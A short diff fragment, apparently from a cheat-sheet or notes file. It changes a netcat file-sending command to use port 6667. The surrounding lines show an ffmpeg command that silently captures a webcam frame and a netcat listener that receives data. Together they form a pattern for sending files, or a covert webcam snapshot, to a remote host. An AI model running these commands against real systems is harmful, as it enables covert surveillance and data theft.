@@ -43,5 +43,5 @@ ffmpeg -f video4linux2 -s 640x480 -i /dev/video0 -ss 0:0:1 -frames 1 /tmp/selfie
 nc -lvp 6667 > out
 ```
 ```
-cat <file> | nc <IP> <PORT>
+cat <file> | nc <IP> 6667
 ```
